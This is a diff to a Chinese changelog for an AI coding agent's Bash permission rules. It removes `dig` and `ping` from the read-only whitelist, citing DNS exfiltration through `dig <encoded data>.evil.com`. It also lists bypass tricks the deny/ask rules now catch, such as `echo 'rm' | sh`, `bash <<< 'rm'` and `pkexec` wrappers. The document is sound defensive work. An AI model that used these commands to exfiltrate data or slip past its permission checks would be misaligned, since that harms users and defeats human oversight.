@@ -429,6 +429,9 @@ WebAssembly 载体整个移除。
   `--edit` / `set`)、`git branch -d/-D/-m/-f/-u/<新名>`、`git tag -d/<新名>`、
   `git remote add/remove/set-url/rename/prune`、`git diff/log/show --output`。`git config key`
   (读)、`git branch` / `git tag` / `git remote` 的列示形式仍是只读。
+- `dig`、`ping` 移出只读白名单,走正常的权限判定(`default` 下询问)。它们按参数里的主机名
+  发 DNS 查询,`dig <编码后的数据>.evil.com` 就能把数据带出去。要免询问的,写
+  `Bash(dig:*)` / `Bash(ping:*)` 这类 allow 规则。
 - `Bash` 的 deny / ask 规则多了几种绕法的识别:`case`/`function`/`select` 块、读 stdin /
   here-string 的裸 `sh` / `bash`(`echo 'rm' | sh`、`bash <<< 'rm'`)程序名读不出来,有带内容的
   deny / ask 规则时按询问处理;`busybox` / `flock` / `ionice` / `chrt` / `taskset` / `pkexec` /
